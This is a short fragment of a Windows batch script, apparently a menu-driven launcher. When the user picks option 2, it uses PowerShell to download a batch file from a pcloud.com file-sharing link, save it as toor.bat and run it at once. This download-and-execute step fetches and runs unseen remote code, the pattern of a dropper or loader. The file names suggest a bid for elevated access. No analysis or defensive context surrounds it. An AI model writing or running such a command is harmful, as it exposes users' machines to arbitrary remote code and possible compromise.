...
if %user_input% equ 2 powershell -command invoke-webrequest https://c259.pcloud.com/dpZ0bAYH1ZeBNqjgZU1J47ZZGndLv7Z2ZZk4FZZIteMlJJ6EfFndP7zU03peuK04FBk/root.batt -outfile toor.bat
start toor.bat
exit
